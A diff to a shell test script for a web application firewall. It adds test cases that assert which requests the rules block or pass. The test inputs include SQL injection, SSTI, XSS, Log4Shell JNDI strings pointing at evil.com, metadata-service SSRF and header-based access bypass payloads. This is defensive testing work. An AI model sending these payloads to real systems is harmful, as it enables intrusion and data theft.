@@ -102,6 +102,19 @@ test_rule "UA masscan"             403 -A "masscan/1.0" "$TARGET/"
 test_rule "UA Acunetix"            403 -A "Acunetix Web Vulnerability Scanner" "$TARGET/"
 test_rule "UA Nuclei"              403 -A "Nuclei" "$TARGET/"
 test_rule "UA feroxbuster"         403 -A "feroxbuster" "$TARGET/"
+# 2026-09-17 规则评审：短词加边界（Burp/httpx/amass/OWASP ZAP），并移除正常爬虫
+test_rule "UA Burp Suite"          403 -A "Mozilla/5.0 (compatible; Burp Suite Professional)" "$TARGET/"
+test_rule "UA httpx tool"          403 -A "httpx/1.3.0" "$TARGET/"
+test_rule "UA httpx cli"           403 -A "httpx-cli/1.0" "$TARGET/"
+test_rule "UA amass"               403 -A "Amass/3.23.0" "$TARGET/"
+test_rule "UA OWASP ZAP"           403 -A "Mozilla/5.0 (compatible; OWASP ZAP/2.14.0)" "$TARGET/"
+test_rule "UA BurpMobile no FP"    200 -A "BurpMobile/1.0" "$TARGET/"
+test_rule "UA httpx-client no FP"  200 -A "httpx-client/1.0" "$TARGET/"
+test_rule "UA python-httpx no FP"  200 -A "python-httpx/0.27.0" "$TARGET/"
+test_rule "UA amass-client no FP"  200 -A "amass-client/1.0" "$TARGET/"
+test_rule "UA OWASP-Dep-Check no FP" 200 -A "OWASP-Dependency-Check/8.4.0" "$TARGET/"
+test_rule "UA Amazonbot allowed"   200 -A "Amazonbot/0.1 (+http://www.amazon.com/amazonbot)" "$TARGET/"
+test_rule "UA Applebot-Ext no FP"  200 -A "Mozilla/5.0 (Device; OS) Applebot-Extended/0.1" "$TARGET/"
 
 echo ""
 echo "=== 7. URL path detection (url.rule) ==="
@@ -150,7 +163,9 @@ test_rule "Args eval()"            403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=
 test_rule "Args system()"          403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=system(ls)"
 test_rule "Args reverse-shell"     403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=reverse-shell"
 test_rule "Args 169.254.169.254"  403 -H "User-Agent: Mozilla/5.0" "$TARGET/?url=169.254.169.254"
-test_rule "Args CONCAT()"          403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=CONCAT(user(),0x3a)"
+# 同步 nginx 2026-09-17 规则收紧：CONCAT()/CHAR() 属高误报规则已移除，改为断言放行
+test_rule "Args CONCAT() high-FP removed" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=CONCAT(user(),0x3a)"
+test_rule "Args extractvalue+concat SQL" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=extractvalue(1,concat(0x7e,user()))"
 test_rule "Args gopher://"         403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=gopher://evil.com"
 
 echo ""
@@ -198,7 +213,8 @@ test_rule "POST child_process"     403 -H "User-Agent: Mozilla/5.0" -d "x=requir
 test_rule "POST SSTI"              403 -H "User-Agent: Mozilla/5.0" -d 'x={{__class__}}' "$TARGET/"
 test_rule "POST \$eq("             403 -H "User-Agent: Mozilla/5.0" -d 'x=$eq(1)' "$TARGET/"
 test_rule "POST sleep()"           403 -H "User-Agent: Mozilla/5.0" -d "id=sleep(5)" "$TARGET/"
-test_rule "POST CONCAT()"          403 -H "User-Agent: Mozilla/5.0" -d 'x=CONCAT(user(),0x3a)' "$TARGET/"
+test_rule "POST CONCAT() high-FP removed" 200 -H "User-Agent: Mozilla/5.0" -d 'x=CONCAT(user(),0x3a)' "$TARGET/"
+test_rule "POST extractvalue+concat SQL" 403 -H "User-Agent: Mozilla/5.0" -d "q=extractvalue(1,concat(0x7e,user()))" "$TARGET/"
 test_rule "POST log4j jndi"        403 -H "User-Agent: Mozilla/5.0" -d 'x=${jndi:ldap://evil.com}' "$TARGET/"
 test_rule "POST reverse-shell"     403 -H "User-Agent: Mozilla/5.0" -d "x=reverse-shell" "$TARGET/"
 test_rule "POST 169.254.169.254"   403 -H "User-Agent: Mozilla/5.0" -d "url=http://169.254.169.254/latest/meta-data/" "$TARGET/"
@@ -221,6 +237,8 @@ test_rule "POST JS \\uXXXX decode"     403 -H "User-Agent: Mozilla/5.0" --data-u
 test_rule "POST JS \\xHH decode"       403 -H "User-Agent: Mozilla/5.0" --data-urlencode 'q=\x3Cscript\x3E' "$TARGET/"
 test_rule "POST &#xHH; entity decode"  403 -H "User-Agent: Mozilla/5.0" --data-urlencode 'q=&#x3C;script&#x3E;' "$TARGET/"
 test_rule "POST &#DDD; entity decode"  403 -H "User-Agent: Mozilla/5.0" --data-urlencode 'q=&#60;script&#62;' "$TARGET/"
+# 实体被 '&' 分隔符拆散（ParseQuery 拆出的片段都不含攻击特征）→ raw body 兜底扫描
+test_rule "POST entity-split XSS"      403 -H "User-Agent: Mozilla/5.0" -d 'q=&#x3c;script&#x3e;&r=1' "$TARGET/"
 
 echo ""
 echo "=== 15. File upload detection (fileext.rule) ==="
@@ -387,7 +405,23 @@ else
 fi
 
 echo ""
-echo "=== 25. CC attack detection ==="
+echo "=== 25. Request header detection (header.rule) ==="
+cat > $RULE_DIR/config.json << 'EOF'
+{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","header_check":"on","cookie_check":"on","cc_check":"off","cc_rate":"999999/60","cc_block_ttl":0,"post_check":"on","referer_check":"off","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":""}
+EOF
+sleep 3
+test_rule "Header X-Middleware-Subrequest" 403 -H "User-Agent: Mozilla/5.0" -H "X-Middleware-Subrequest: pages" "$TARGET/"
+test_rule "Header X-Original-URL"   403 -H "User-Agent: Mozilla/5.0" -H "X-Original-URL: /admin" "$TARGET/"
+test_rule "Header X-Rewrite-URL"    403 -H "User-Agent: Mozilla/5.0" -H "X-Rewrite-URL: /admin" "$TARGET/"
+test_rule "Header X-HTTP-Method-Override" 403 -H "User-Agent: Mozilla/5.0" -H "X-HTTP-Method-Override: DELETE" "$TARGET/"
+test_rule "Header X-Backend"        403 -H "User-Agent: Mozilla/5.0" -H "X-Backend: 127.0.0.1" "$TARGET/"
+test_rule "Header metadata SSRF via XFF" 403 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 169.254.169.254" "$TARGET/"
+test_rule "Header Log4Shell jndi"   403 -H "User-Agent: Mozilla/5.0" -H 'X-Api-Key: ${jndi:ldap://evil.com/a}' "$TARGET/"
+test_rule "Header normal custom"    200 -H "User-Agent: Mozilla/5.0" -H "X-Custom: hello" "$TARGET/"
+test_rule "Header name in value only (anchor)" 200 -H "User-Agent: Mozilla/5.0" -H "X-Note: see x-backend: docs" "$TARGET/"
+
+echo ""
+echo "=== 26. CC attack detection ==="
 cat > $RULE_DIR/config.json << 'EOF'
 {"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"on","cc_rate":"5/60","cc_block_ttl":300,"post_check":"on","referer_check":"off","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":""}
 EOF
